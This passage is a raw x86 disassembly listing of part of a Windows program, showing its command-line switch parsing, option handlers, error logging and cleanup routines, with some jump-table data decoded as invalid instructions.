  4036a2:	add    esp,0x10
  4036a5:	jmp    0x4036e6
  4036a7:	mov    edx,DWORD PTR [ebp-0x4]
  4036aa:	mov    ecx,esi
  4036ac:	push   edi
  4036ad:	call   0x4034ff
  4036b2:	test   eax,eax
  4036b4:	jns    0x4036df
  4036b6:	push   0x401580
  4036bb:	push   0x5a
  4036bd:	push   0x401554
  4036c2:	push   0x1
  4036c4:	call   0x4052c4
  4036c9:	mov    eax,fs:0x30
  4036cf:	add    esp,0x10
  4036d2:	push   esi
  4036d3:	push   ebx
  4036d4:	push   DWORD PTR [eax+0x18]
  4036d7:	call   DWORD PTR ds:0x40a170
  4036dd:	jmp    0x4036e6
  4036df:	mov    eax,DWORD PTR [ebp-0x8]
  4036e2:	mov    bl,0x1
  4036e4:	mov    DWORD PTR [eax],esi
  4036e6:	pop    edi
  4036e7:	pop    esi
  4036e8:	mov    al,bl
  4036ea:	pop    ebx
  4036eb:	mov    esp,ebp
  4036ed:	pop    ebp
  4036ee:	ret    
  4036ef:	int3   
  4036f0:	int3   
  4036f1:	int3   
  4036f2:	int3   
  4036f3:	int3   
  4036f4:	mov    edi,edi
  4036f6:	push   ebp
  4036f7:	mov    ebp,esp
  4036f9:	sub    esp,0x24
  4036fc:	mov    eax,ds:0x409004
  403701:	xor    eax,ebp
  403703:	mov    DWORD PTR [ebp-0x4],eax
  403706:	xor    eax,eax
  403708:	push   ebx
  403709:	push   edi
  40370a:	mov    DWORD PTR [ebp-0x24],eax
  40370d:	mov    edi,edx
  40370f:	mov    DWORD PTR [ebp-0x20],eax
  403712:	lea    eax,[ebp-0x20]
  403715:	push   eax
  403716:	push   ecx
  403717:	call   DWORD PTR ds:0x40b000
  40371d:	mov    ebx,eax
  40371f:	test   ebx,ebx
  403721:	jne    0x403741
  403723:	push   0x4015a8
  403728:	push   0xa4
  40372d:	push   0x4015c8
  403732:	push   0x1
  403734:	call   0x4052c4
  403739:	add    esp,0x10
  40373c:	jmp    0x403a18
  403741:	push   esi
  403742:	xor    esi,esi
  403744:	cmp    DWORD PTR [ebp-0x20],esi
  403747:	jle    0x403a0c
  40374d:	mov    ecx,DWORD PTR [ebx+esi*4]
  403750:	movzx  eax,WORD PTR [ecx]
  403753:	cmp    eax,0x2d
  403756:	je     0x403761
  403758:	cmp    eax,0x2f
  40375b:	jne    0x403a02
  403761:	movzx  eax,WORD PTR [ecx+0x2]
  403765:	add    eax,0xffffffbf
  403768:	cmp    eax,0x37
  40376b:	ja     0x403a02
  403771:	movzx  eax,BYTE PTR [eax+0x403b3c]
  403778:	jmp    DWORD PTR [eax*4+0x403afc]
  40377f:	inc    esi
  403780:	cmp    esi,DWORD PTR [ebp-0x20]
  403783:	jge    0x403a2b
  403789:	mov    ecx,DWORD PTR [ebx+esi*4]
  40378c:	lea    edx,[edi+0x328]
  403792:	call   0x403611
  403797:	test   al,al
  403799:	jne    0x403a02
  40379f:	push   0x4015dc
  4037a4:	push   0xb7
  4037a9:	jmp    0x403ada
  4037ae:	inc    esi
  4037af:	cmp    esi,DWORD PTR [ebp-0x20]
  4037b2:	jge    0x403a58
  4037b8:	push   ecx
  4037b9:	push   DWORD PTR [ebx+esi*4]
  4037bc:	push   ecx
  4037bd:	push   0xb
  4037bf:	pop    edx
  4037c0:	lea    ecx,[ebp-0x1c]
  4037c3:	call   0x40353a
  4037c8:	test   eax,eax
  4037ca:	js     0x403a49
  4037d0:	lea    eax,[ebp-0x1c]
  4037d3:	push   eax
  4037d4:	call   DWORD PTR ds:0x40a144
  4037da:	pop    ecx
  4037db:	sub    eax,0x1
  4037de:	je     0x403821
  4037e0:	sub    eax,0x1
  4037e3:	je     0x403812
  4037e5:	dec    eax
  4037e6:	sub    eax,0x1
  4037e9:	je     0x403803
  4037eb:	sub    eax,0xc
  4037ee:	jne    0x403a3a
  4037f4:	mov    DWORD PTR [edi+0x33c],0x3
  4037fe:	jmp    0x403a02
  403803:	mov    DWORD PTR [edi+0x33c],0x2
  40380d:	jmp    0x403a02
  403812:	mov    DWORD PTR [edi+0x33c],0x1
  40381c:	jmp    0x403a02
  403821:	and    DWORD PTR [edi+0x33c],0x0
  403828:	jmp    0x403a02
  40382d:	mov    DWORD PTR [edi+0x340],0x1
  403837:	jmp    0x403a02
  40383c:	mov    DWORD PTR [edi+0x340],0x2
  403846:	jmp    0x403a02
  40384b:	inc    esi
  40384c:	cmp    esi,DWORD PTR [ebp-0x20]
  40384f:	jge    0x403a70
  403855:	push   DWORD PTR [ebx+esi*4]
  403858:	mov    edx,0x104
  40385d:	mov    ecx,edi
  40385f:	call   0x4034c5
  403864:	test   eax,eax
  403866:	js     0x403a64
  40386c:	push   0x4010dc
  403871:	push   edi
  403872:	call   DWORD PTR ds:0x40a150
  403878:	pop    ecx
  403879:	pop    ecx
  40387a:	test   eax,eax
  40387c:	jne    0x403a02
  403882:	push   0x208
  403887:	push   eax
  403888:	push   edi
  403889:	call   0x407abc
  40388e:	add    esp,0xc
  403891:	jmp    0x403a02
  403896:	inc    esi
  403897:	cmp    esi,DWORD PTR [ebp-0x20]
  40389a:	jge    0x403a7c
  4038a0:	push   0xa
  4038a2:	push   0x0
  4038a4:	push   DWORD PTR [ebx+esi*4]
  4038a7:	call   DWORD PTR ds:0x40a148
  4038ad:	add    esp,0xc
  4038b0:	mov    DWORD PTR [edi+0x344],eax
  4038b6:	jmp    0x403a02
  4038bb:	inc    esi
  4038bc:	cmp    esi,DWORD PTR [ebp-0x20]
  4038bf:	jge    0x403a88
  4038c5:	push   DWORD PTR [ebx+esi*4]
  4038c8:	lea    ecx,[edi+0x208]
  4038ce:	push   0x40
  4038d0:	pop    edx
  4038d1:	call   0x4034c5
  4038d6:	test   eax,eax
  4038d8:	jns    0x403a02
  4038de:	push   0x4016ec
  4038e3:	push   0x13b
  4038e8:	jmp    0x403ada
  4038ed:	inc    esi
  4038ee:	cmp    esi,DWORD PTR [ebp-0x20]
  4038f1:	jge    0x403a94
  4038f7:	push   0xa
  4038f9:	push   0x0
  4038fb:	push   DWORD PTR [ebx+esi*4]
  4038fe:	call   DWORD PTR ds:0x40a148
  403904:	add    esp,0xc
  403907:	mov    DWORD PTR [edi+0x348],eax
  40390d:	jmp    0x403a02
  403912:	mov    DWORD PTR [edi+0x354],0x1
  40391c:	mov    DWORD PTR [edi+0x350],0x1
  403926:	jmp    0x403a02
  40392b:	inc    esi
  40392c:	cmp    esi,DWORD PTR [ebp-0x20]
  40392f:	jge    0x403aa0
  403935:	mov    ecx,DWORD PTR [ebx+esi*4]
  403938:	lea    edx,[edi+0x34c]
  40393e:	call   0x403611
  403943:	test   al,al
  403945:	jne    0x403a02
  40394b:	push   0x401758
  403950:	push   0x174
  403955:	jmp    0x403ada
  40395a:	inc    esi
  40395b:	cmp    esi,DWORD PTR [ebp-0x20]
  40395e:	jge    0x403aac
  403964:	mov    ecx,DWORD PTR [ebx+esi*4]
  403967:	lea    edx,[edi+0x330]
  40396d:	call   0x403611
  403972:	test   al,al
  403974:	jne    0x403a02
  40397a:	push   0x4017a4
  40397f:	push   0x187
  403984:	jmp    0x403ada
  403989:	inc    esi
  40398a:	cmp    esi,DWORD PTR [ebp-0x20]
  40398d:	jge    0x403ab8
  403993:	mov    ecx,DWORD PTR [ebx+esi*4]
  403996:	lea    edx,[edi+0x334]
  40399c:	call   0x403611
  4039a1:	test   al,al
  4039a3:	jne    0x403a02
  4039a5:	push   0x4017c8
  4039aa:	push   0x19a
  4039af:	jmp    0x403ada
  4039b4:	inc    esi
  4039b5:	cmp    esi,DWORD PTR [ebp-0x20]
  4039b8:	jge    0x403ac4
  4039be:	mov    ecx,DWORD PTR [ebx+esi*4]
  4039c1:	lea    edx,[edi+0x32c]
  4039c7:	call   0x403611
  4039cc:	test   al,al
  4039ce:	jne    0x403a02
  4039d0:	push   0x4017e8
  4039d5:	push   0x1ad
  4039da:	jmp    0x403ada
  4039df:	inc    esi
  4039e0:	cmp    esi,DWORD PTR [ebp-0x20]
  4039e3:	jge    0x403aee
  4039e9:	push   DWORD PTR [ebx+esi*4]
  4039ec:	lea    ecx,[edi+0x288]
  4039f2:	push   0x40
  4039f4:	pop    edx
  4039f5:	call   0x4034c5
  4039fa:	test   eax,eax
  4039fc:	js     0x403ad0
  403a02:	inc    esi
  403a03:	cmp    esi,DWORD PTR [ebp-0x20]
  403a06:	jl     0x40374d
  403a0c:	mov    BYTE PTR [ebp-0x24],0x1
  403a10:	push   ebx
  403a11:	call   DWORD PTR ds:0x40a030
  403a17:	pop    esi
  403a18:	mov    ecx,DWORD PTR [ebp-0x4]
  403a1b:	mov    eax,DWORD PTR [ebp-0x24]
  403a1e:	xor    ecx,ebp
  403a20:	pop    edi
  403a21:	pop    ebx
  403a22:	call   0x407330
  403a27:	mov    esp,ebp
  403a29:	pop    ebp
  403a2a:	ret    
  403a2b:	push   0x4015dc
  403a30:	push   0xb1
  403a35:	jmp    0x403ada
  403a3a:	push   0x401640
  403a3f:	push   0xe9
  403a44:	jmp    0x403ada
  403a49:	push   0x401624
  403a4e:	push   0xd0
  403a53:	jmp    0x403ada
  403a58:	push   0x401600
  403a5d:	push   0xc7
  403a62:	jmp    0x403ada
  403a64:	push   0x401680
  403a69:	push   0x10d
  403a6e:	jmp    0x403ada
  403a70:	push   0x401654
  403a75:	push   0x104
  403a7a:	jmp    0x403ada
  403a7c:	push   0x4016a0
  403a81:	push   0x123
  403a86:	jmp    0x403ada
  403a88:	push   0x4016c4
  403a8d:	push   0x132
  403a92:	jmp    0x403ada
  403a94:	push   0x40170c
  403a99:	push   0x148
  403a9e:	jmp    0x403ada
  403aa0:	push   0x401730
  403aa5:	push   0x16e
  403aaa:	jmp    0x403ada
  403aac:	push   0x401780
  403ab1:	push   0x181
  403ab6:	jmp    0x403ada
  403ab8:	push   0x4017c8
  403abd:	push   0x194
  403ac2:	jmp    0x403ada
  403ac4:	push   0x4017e8
  403ac9:	push   0x1a7
  403ace:	jmp    0x403ada
  403ad0:	push   0x40183c
  403ad5:	push   0x1c3
  403ada:	push   0x4015c8
  403adf:	push   0x1
  403ae1:	call   0x4052c4
  403ae6:	add    esp,0x10
  403ae9:	jmp    0x403a10
  403aee:	push   0x401810
  403af3:	push   0x1ba
  403af8:	jmp    0x403ada
  403afa:	mov    edi,edi
  403afc:	jg     0x403b35
  403afe:	inc    eax
  403aff:	add    BYTE PTR [esi+0x2d004037],ch
  403b05:	cmp    BYTE PTR [eax+0x0],al
  403b08:	cmp    al,0x38
  403b0a:	inc    eax
  403b0b:	add    BYTE PTR [ebx+0x38],cl
  403b0e:	inc    eax
  403b0f:	add    BYTE PTR [esi-0x44ffbfc8],dl
  403b15:	cmp    BYTE PTR [eax+0x0],al
  403b18:	in     eax,dx
  403b19:	cmp    BYTE PTR [eax+0x0],al
  403b1c:	sbb    al,0x39
  403b1e:	inc    eax
  403b1f:	add    BYTE PTR [edx],dl
  403b21:	cmp    DWORD PTR [eax+0x0],eax
  403b24:	sub    edi,DWORD PTR [ecx]
  403b26:	inc    eax
  403b27:	add    BYTE PTR [edx+0x39],bl
  403b2a:	inc    eax
  403b2b:	add    BYTE PTR [ecx-0x4bffbfc7],cl
  403b31:	cmp    DWORD PTR [eax+0x0],eax
  403b34:	fistp  QWORD PTR [ecx]
  403b36:	inc    eax
  403b37:	add    BYTE PTR [edx],al
  403b39:	cmp    al,BYTE PTR [eax+0x0]
  403b3c:	add    BYTE PTR [ecx],al
  403b3e:	add    al,BYTE PTR [ebx]
  403b40:	add    al,0x5
  403b42:	push   es
  403b43:	(bad)  
  403b44:	(bad)  
  403b45:	sysret 
  403b47:	invd   
  403b49:	wbinvd 
  403b4b:	or     cl,BYTE PTR [edi]
  403b4d:	ud2    
  403b4f:	(bad)  
  403b51:	or     eax,0xf0f0e0f
  403b56:	(bad)  
  403b57:	(bad)  
  403b58:	(bad)  
  403b59:	(bad)  
  403b5a:	(bad)  
  403b5b:	sldt   WORD PTR [ecx]
  403b5e:	add    al,BYTE PTR [ebx]
  403b60:	add    al,0x5
  403b62:	push   es
  403b63:	(bad)  
  403b64:	(bad)  
  403b65:	sysret 
  403b67:	invd   
  403b69:	wbinvd 
  403b6b:	or     cl,BYTE PTR [edi]
  403b6d:	ud2    
  403b6f:	(bad)  
  403b71:	or     eax,0xcccc0e0f
  403b76:	int3   
  403b77:	int3   
  403b78:	int3   
  403b79:	mov    edi,edi
  403b7b:	push   ebx
  403b7c:	xor    eax,eax
  403b7e:	xor    ebx,ebx
  403b80:	cmp    ax,WORD PTR [ecx+0x208]
  403b87:	jne    0x403b95
  403b89:	push   0x40185c
  403b8e:	push   0x1fa
  403b93:	jmp    0x403be6
  403b95:	xor    eax,eax
  403b97:	cmp    ax,WORD PTR [ecx+0x288]
  403b9e:	jne    0x403bac
  403ba0:	push   0x401890
  403ba5:	push   0x203
  403baa:	jmp    0x403be6
  403bac:	cmp    DWORD PTR [ecx+0x328],ebx
  403bb2:	jne    0x403bc0
  403bb4:	push   0x4018b4
  403bb9:	push   0x20c
  403bbe:	jmp    0x403be6
  403bc0:	cmp    DWORD PTR [ecx+0x32c],ebx
  403bc6:	jne    0x403bd4
  403bc8:	push   0x4018d8
  403bcd:	push   0x215
  403bd2:	jmp    0x403be6
  403bd4:	cmp    DWORD PTR [ecx+0x330],ebx
  403bda:	jne    0x403bf7
  403bdc:	push   0x4018f8
  403be1:	push   0x21e
  403be6:	push   0x40187c
  403beb:	push   0x1
  403bed:	call   0x4052c4
  403bf2:	add    esp,0x10
  403bf5:	jmp    0x403bf9
  403bf7:	mov    bl,0x1
  403bf9:	mov    al,bl
  403bfb:	pop    ebx
  403bfc:	ret    
  403bfd:	int3   
  403bfe:	int3   
  403bff:	int3   
  403c00:	int3   
  403c01:	int3   
  403c02:	mov    edi,edi
  403c04:	push   ebp
  403c05:	mov    ebp,esp
  403c07:	and    esp,0xfffffff8
  403c0a:	sub    esp,0x36c
  403c10:	mov    eax,ds:0x409004
  403c15:	xor    eax,esp
  403c17:	mov    DWORD PTR [esp+0x368],eax
  403c1e:	push   ebx
  403c1f:	push   esi
  403c20:	mov    esi,DWORD PTR [ebp+0x10]
  403c23:	lea    eax,[esp+0x14]
  403c27:	push   edi
  403c28:	xor    ebx,ebx
  403c2a:	xor    edi,edi
  403c2c:	push   0x358
  403c31:	push   ebx
  403c32:	inc    edi
  403c33:	mov    DWORD PTR [esp+0x1c],ebx
  403c37:	push   eax
  403c38:	mov    DWORD PTR [esp+0x1c],edi
  403c3c:	call   0x407abc
  403c41:	add    esp,0xc
  403c44:	push   ebx
  403c45:	push   ebx
  403c46:	push   edi
  403c47:	push   ebx
  403c48:	call   DWORD PTR ds:0x40a028
  403c4e:	lea    eax,[esp+0x14]
  403c52:	push   eax
  403c53:	call   DWORD PTR ds:0x40a04c
  403c59:	push   eax
  403c5a:	call   DWORD PTR ds:0x40a024
  403c60:	test   eax,eax
  403c62:	je     0x403e36
  403c68:	cmp    DWORD PTR [esp+0x14],ebx
  403c6c:	je     0x403e36
  403c72:	push   0x40191c
  403c77:	call   DWORD PTR ds:0x40a02c
  403c7d:	mov    edi,eax
  403c7f:	test   edi,edi
  403c81:	je     0x403e36
  403c87:	test   esi,esi
  403c89:	jne    0x403c97
  403c8b:	push   0x401934
  403c90:	push   0x275
  403c95:	jmp    0x403cea
  403c97:	lea    edx,[esp+0x18]
  403c9b:	mov    ecx,esi
  403c9d:	call   0x4036f4
  403ca2:	test   al,al
  403ca4:	jne    0x403cb2
  403ca6:	push   0x401964
  403cab:	push   0x27e
  403cb0:	jmp    0x403cea
  403cb2:	cmp    DWORD PTR [esp+0x358],0x1
  403cba:	je     0x403cd3
  403cbc:	mov    eax,DWORD PTR [esp+0x358]
  403cc3:	sub    eax,0x2
  403cc6:	neg    eax
  403cc8:	sbb    eax,eax
  403cca:	not    eax
  403ccc:	and    DWORD PTR [esp+0x358],eax
  403cd3:	lea    ecx,[esp+0x18]
  403cd7:	call   0x403b79
  403cdc:	test   al,al
  403cde:	jne    0x403cf3
  403ce0:	push   0x40198c
  403ce5:	push   0x28d
  403cea:	push   0x401958
  403cef:	push   0x1
  403cf1:	jmp    0x403d1d
  403cf3:	cmp    DWORD PTR [esp+0x354],0x2
  403cfb:	jne    0x403d27
  403cfd:	lea    eax,[esp+0x18]
  403d01:	push   eax
  403d02:	call   DWORD PTR ds:0x40a0dc
  403d08:	test   eax,eax
  403d0a:	jne    0x403d27
  403d0c:	push   0x4019b8
  403d11:	push   0x29a
  403d16:	push   0x401958
  403d1b:	push   0x3
  403d1d:	call   0x4052c4
  403d22:	add    esp,0x10
  403d25:	jmp    0x403d6c
  403d27:	mov    esi,0x403f30
  403d2c:	cmp    DWORD PTR [esp+0x358],ebx
  403d33:	je     0x403d3a
  403d35:	mov    esi,0x403f10
  403d3a:	lea    eax,[esp+0x10]
  403d3e:	mov    ecx,esi
  403d40:	push   eax
  403d41:	lea    eax,[esp+0x1c]
  403d45:	push   eax
  403d46:	call   DWORD PTR ds:0x40a1c4
  403d4c:	call   esi
  403d4e:	test   eax,eax
  403d50:	jns    0x403d6c
  403d52:	push   eax
  403d53:	push   0x4019e4
  403d58:	push   0x2a4
  403d5d:	push   0x401958
  403d62:	push   0x1
  403d64:	call   0x4052c4
  403d69:	add    esp,0x14
  403d6c:	cmp    DWORD PTR [esp+0x340],ebx
  403d73:	je     0x403d93
  403d75:	push   DWORD PTR [esp+0x340]
  403d7c:	mov    eax,fs:0x30
  403d82:	push   ebx
  403d83:	push   DWORD PTR [eax+0x18]
  403d86:	call   DWORD PTR ds:0x40a170
  403d8c:	mov    DWORD PTR [esp+0x340],ebx
  403d93:	cmp    DWORD PTR [esp+0x344],ebx
  403d9a:	je     0x403dba
  403d9c:	push   DWORD PTR [esp+0x344]
  403da3:	mov    eax,fs:0x30
  403da9:	push   ebx
  403daa:	push   DWORD PTR [eax+0x18]
  403dad:	call   DWORD PTR ds:0x40a170
  403db3:	mov    DWORD PTR [esp+0x344],ebx
  403dba:	cmp    DWORD PTR [esp+0x348],ebx
  403dc1:	je     0x403de1
  403dc3:	push   DWORD PTR [esp+0x348]
  403dca:	mov    eax,fs:0x30
  403dd0:	push   ebx
  403dd1:	push   DWORD PTR [eax+0x18]
  403dd4:	call   DWORD PTR ds:0x40a170
  403dda:	mov    DWORD PTR [esp+0x348],ebx
  403de1:	cmp    DWORD PTR [esp+0x34c],ebx
  403de8:	je     0x403e08
  403dea:	push   DWORD PTR [esp+0x34c]
  403df1:	mov    eax,fs:0x30
  403df7:	push   ebx
  403df8:	push   DWORD PTR [eax+0x18]
  403dfb:	call   DWORD PTR ds:0x40a170
  403e01:	mov    DWORD PTR [esp+0x34c],ebx
  403e08:	cmp    DWORD PTR [esp+0x364],ebx
  403e0f:	je     0x403e2f
  403e11:	push   DWORD PTR [esp+0x364]
  403e18:	mov    eax,fs:0x30
  403e1e:	push   ebx
  403e1f:	push   DWORD PTR [eax+0x18]
  403e22:	call   DWORD PTR ds:0x40a170
  403e28:	mov    DWORD PTR [esp+0x364],ebx
  403e2f:	push   edi
  403e30:	call   DWORD PTR ds:0x40a048
  403e36:	mov    ecx,DWORD PTR [esp+0x374]
  403e3d:	mov    eax,DWORD PTR [esp+0x10]
  403e41:	pop    edi
  403e42:	pop    esi
  403e43:	pop    ebx
  403e44:	xor    ecx,esp
  403e46:	call   0x407330
  403e4b:	mov    esp,ebp
  403e4d:	pop    ebp
  403e4e:	ret    0x10
  403e51:	int3   
  403e52:	int3   
  403e53:	int3   
  403e54:	int3   
  403e55:	int3   
  403e56:	mov    edi,edi
  403e58:	push   ebp
  403e59:	mov    ebp,esp
  403e5b:	mov    eax,DWORD PTR [ebp+0xc]
  403e5e:	push   esi
  403e5f:	xor    esi,esi
  403e61:	test   eax,eax
  403e63:	je     0x403e6c
  403e65:	cmp    eax,0x7fffffff
  403e6a:	jbe    0x403e71
  403e6c:	mov    esi,0x80070057
  403e71:	test   esi,esi
  403e73:	js     0x403eac
  403e75:	push   ebx
  403e76:	mov    ebx,DWORD PTR [ebp+0x8]
  403e79:	xor    esi,esi
  403e7b:	push   edi
  403e7c:	lea    edi,[eax-0x1]
  403e7f:	lea    eax,[ebp+0x14]
  403e82:	push   eax
  403e83:	push   DWORD PTR [ebp+0x10]
  403e86:	push   edi
  403e87:	push   ebx
  403e88:	call   DWORD PTR ds:0x40a140
  403e8e:	add    esp,0x10
  403e91:	test   eax,eax
  403e93:	js     0x403e9d
  403e95:	cmp    eax,edi
  403e97:	ja     0x403e9d
  403e99:	jne    0x403ea8
  403e9b:	jmp    0x403ea2
  403e9d:	mov    esi,0x8007007a
  403ea2:	xor    eax,eax
  403ea4:	mov    WORD PTR [ebx+edi*2],ax
  403ea8:	pop    edi
  403ea9:	pop    ebx
  403eaa:	jmp    0x403eb8
  403eac:	test   eax,eax
  403eae:	je     0x403eb8
  403eb0:	mov    ecx,DWORD PTR [ebp+0x8]
  403eb3:	xor    eax,eax
  403eb5:	mov    WORD PTR [ecx],ax
  403eb8:	mov    eax,esi
  403eba:	pop    esi
  403ebb:	pop    ebp
  403ebc:	ret    
  403ebd:	int3   
  403ebe:	int3   
  403ebf:	int3   
  403ec0:	int3   
  403ec1:	int3   
  403ec2:	mov    edi,edi
  403ec4:	push   ebp
  403ec5:	mov    ebp,esp
  403ec7:	push   esi
  403ec8:	mov    esi,ecx
  403eca:	push   esi
  403ecb:	lea    eax,[esi+0x4]
  403ece:	push   eax
  403ecf:	push   DWORD PTR [ebp+0xc]
  403ed2:	push   DWORD PTR [ebp+0x8]
  403ed5:	call   DWORD PTR ds:0x40a0cc
  403edb:	test   eax,eax
  403edd:	jns    0x403ef0
  403edf:	push   0x0
  403ee1:	push   0x0
  403ee3:	push   0x1
  403ee5:	push   0xc000000d
  403eea:	call   DWORD PTR ds:0x40a038
  403ef0:	mov    eax,esi
  403ef2:	pop    esi
  403ef3:	pop    ebp
  403ef4:	ret    0x8
  403ef7:	int3   
  403ef8:	int3   
  403ef9:	int3   
  403efa:	int3   
  403efb:	int3   
  403efc:	push   DWORD PTR [ecx]
  403efe:	call   DWORD PTR ds:0x40a0c8
  403f04:	ret    
  403f05:	int3   
  403f06:	int3   
  403f07:	int3   
  403f08:	int3   
  403f09:	int3   
  403f0a:	int3   
  403f0b:	int3   
  403f0c:	int3   
  403f0d:	int3   
  403f0e:	int3   
  403f0f:	int3   
  403f10:	mov    edi,edi
  403f12:	push   ebp
  403f13:	mov    ebp,esp
  403f15:	mov    ecx,DWORD PTR [ebp+0x8]
  403f18:	call   0x40329d
  403f1d:	mov    ecx,DWORD PTR [ebp+0xc]
  403f20:	mov    DWORD PTR [ecx],eax
  403f22:	xor    eax,eax
  403f24:	pop    ebp
  403f25:	ret    0x8
  403f28:	int3   
  403f29:	int3   
  403f2a:	int3   
  403f2b:	int3   
  403f2c:	int3   
  403f2d:	int3   
  403f2e:	int3   
  403f2f:	int3   
  403f30:	mov    edi,edi
  403f32:	push   ebp
  403f33:	mov    ebp,esp
  403f35:	and    esp,0xfffffff8
  403f38:	mov    ecx,DWORD PTR [ebp+0x8]
  403f3b:	push   esi
  403f3c:	mov    esi,DWORD PTR [ebp+0xc]
  403f3f:	push   edi
  403f40:	xor    edi,edi
  403f42:	mov    DWORD PTR [esi],0x1
  403f48:	mov    edx,DWORD PTR [ecx+0x33c]
  403f4e:	mov    eax,edx
  403f50:	sub    eax,edi
  403f52:	je     0x403feb
  403f58:	sub    eax,0x1
  403f5b:	je     0x403fd3
  403f5d:	sub    eax,0x1
  403f60:	je     0x403fc2
  403f62:	sub    eax,0x1
  403f65:	je     0x403f88
  403f67:	push   edx
  403f68:	push   0x401a10
  403f6d:	push   0xf5
  403f72:	push   0x401a54
  403f77:	push   0x1
  403f79:	call   0x4052c4
  403f7e:	add    esp,0x14
  403f81:	mov    eax,0x80004001
  403f86:	jmp    0x403ffc
  403f88:	cmp    DWORD PTR [ecx+0x354],edi
  403f8e:	je     0x403f9c
  403f90:	mov    eax,0x1a6
  403f95:	mov    edx,0x962fc
  403f9a:	jmp    0x403fba
  403f9c:	cmp    DWORD PTR [ecx+0x350],edi
  403fa2:	je     0x403fb0
  403fa4:	mov    eax,0x1a5
  403fa9:	mov    edx,0x96302
  403fae:	jmp    0x403fba
  403fb0:	mov    eax,0x1a2
  403fb5:	mov    edx,0x96303
  403fba:	push   eax
  403fbb:	push   0x1a1
  403fc0:	jmp    0x403ff7
  403fc2:	push   0x1a4
  403fc7:	push   0x1a3
  403fcc:	mov    edx,0x962fd
  403fd1:	jmp    0x403ff7
  403fd3:	push   0x1a0
  403fd8:	push   0x19f
  403fdd:	mov    edx,0x7ecbb
  403fe2:	call   0x404009
  403fe7:	mov    DWORD PTR [esi],edi
  403fe9:	jmp    0x403ffc
  403feb:	push   0x19e
  403ff0:	push   0x19d
  403ff5:	xor    edx,edx
  403ff7:	call   0x404009
  403ffc:	pop    edi
  403ffd:	pop    esi
  403ffe:	mov    esp,ebp
  404000:	pop    ebp
  404001:	ret    0x8
  404004:	int3   
  404005:	int3   
  404006:	int3   
  404007:	int3   
  404008:	int3   
  404009:	push   0x244
  40400e:	mov    eax,0x407add
  404013:	call   0x407a68
  404018:	mov    DWORD PTR [ebp-0x234],edx
  40401e:	mov    esi,ecx
  404020:	mov    DWORD PTR [ebp-0x250],esi
  404026:	xor    ecx,ecx
  404028:	xor    eax,eax
  40402a:	push   0x206
  40402f:	mov    WORD PTR [ebp-0x218],ax
  404036:	lea    eax,[ebp-0x216]
  40403c:	push   ecx
  40403d:	push   eax
  40403e:	mov    DWORD PTR [ebp-0x23c],ecx
  404044:	mov    DWORD PTR [ebp-0x244],ecx
  40404a:	mov    DWORD PTR [ebp-0x240],ecx
  404050:	call   0x407abc
  404055:	xor    ebx,ebx
  404057:	add    esp,0xc
  40405a:	cmp    DWORD PTR [esi+0x344],ebx
  404060:	mov    edi,0x80004005
  404065:	setne  bl
  404068:	xor    eax,eax
  40406a:	cmp    eax,DWORD PTR [esi+0x348]
  404070:	sbb    eax,eax
  404072:	neg    eax
  404074:	mov    DWORD PTR [ebp-0x24c],eax
  40407a:	test   ebx,ebx
  40407c:	jne    0x4040a8
  40407e:	test   eax,eax
  404080:	jne    0x4040a8
  404082:	mov    eax,DWORD PTR [ebp-0x234]
  404088:	test   eax,eax
  40408a:	mov    DWORD PTR [esi+0x344],eax
  404090:	setne  bl
  404093:	test   ebx,ebx
  404095:	jne    0x4040a8
  404097:	cmp    DWORD PTR [esi+0x33c],0x1
  40409e:	je     0x4040a8
  4040a0:	xor    edi,edi
  4040a2:	inc    edi
  4040a3:	jmp    0x4043ff
  4040a8:	call   0x403069
  4040ad:	mov    DWORD PTR [ebp-0x248],eax
  4040b3:	test   eax,eax
  4040b5:	jne    0x4040d5
  4040b7:	push   0x4013c4
  4040bc:	push   0x143
  4040c1:	push   0x401a70
  4040c6:	push   0x1
  4040c8:	call   0x4052c4
  4040cd:	add    esp,0x10
  4040d0:	jmp    0x4043ff
  4040d5:	lea    ecx,[ebp-0x240]
  4040db:	mov    edx,eax
  4040dd:	push   ecx
  4040de:	lea    ecx,[ebp-0x244]
  4040e4:	push   ecx
  4040e5:	lea    ecx,[ebp-0x23c]
  4040eb:	push   ecx
  4040ec:	push   DWORD PTR [ebp+0xc]
  4040ef:	mov    ecx,esi
  4040f1:	push   DWORD PTR [ebp+0x8]
  4040f4:	call   0x404f9e
  4040f9:	mov    edi,eax
  4040fb:	test   edi,edi
  4040fd:	jns    0x40411f
  4040ff:	push   0x401a90
  404104:	push   0x14f
  404109:	push   0x401a70
  40410e:	push   0x1
  404110:	call   0x4052c4
  404115:	add    esp,0x10
  404118:	xor    ebx,ebx
  40411a:	jmp    0x40439a
  40411f:	xor    eax,eax
  404121:	mov    DWORD PTR [ebp-0x238],eax
  404127:	mov    DWORD PTR [ebp-0x4],eax
  40412a:	mov    DWORD PTR [ebp-0x234],eax
  404130:	push   0x1
  404132:	mov    BYTE PTR [ebp-0x4],0x1
  404136:	call   DWORD PTR ds:0x40a0b8
  40413c:	mov    edi,eax
  40413e:	test   edi,edi
  404140:	jns    0x4041ae
  404142:	push   edi
  404143:	push   0x401ad0
  404148:	push   0x15d
  40414d:	push   0x401a70
  404152:	push   0x1
  404154:	call   0x4052c4
  404159:	xor    ebx,ebx
  40415b:	add    esp,0x14
  40415e:	mov    BYTE PTR [ebp-0x4],bl
  404161:	mov    ecx,DWORD PTR [ebp-0x234]
  404167:	test   ecx,ecx
  404169:	je     0x404181
  40416b:	mov    DWORD PTR [ebp-0x234],ebx
  404171:	mov    eax,DWORD PTR [ecx]
  404173:	push   ecx
  404174:	mov    esi,DWORD PTR [eax+0x8]
  404177:	mov    ecx,esi
  404179:	call   DWORD PTR ds:0x40a1c4
  40417f:	call   esi
  404181:	or     DWORD PTR [ebp-0x4],0xffffffff
  404185:	mov    ecx,DWORD PTR [ebp-0x238]
  40418b:	test   ecx,ecx
  40418d:	je     0x40439a
  404193:	mov    DWORD PTR [ebp-0x238],ebx
  404199:	mov    eax,DWORD PTR [ecx]
  40419b:	push   ecx
  40419c:	mov    esi,DWORD PTR [eax+0x8]
  40419f:	mov    ecx,esi
  4041a1:	call   DWORD PTR ds:0x40a1c4
  4041a7:	call   esi
  4041a9:	jmp    0x40439a
  4041ae:	lea    eax,[ebp-0x230]
  4041b4:	push   eax
  4041b5:	lea    eax,[ebp-0x22c]
  4041bb:	push   eax
  4041bc:	push   0x31
  4041be:	push   0x401410
  4041c3:	call   DWORD PTR ds:0x40a0cc
  4041c9:	test   eax,eax
  4041cb:	jns    0x4041de
  4041cd:	push   0x0
  4041cf:	push   0x0
  4041d1:	push   0x1
  4041d3:	push   0xc000000d
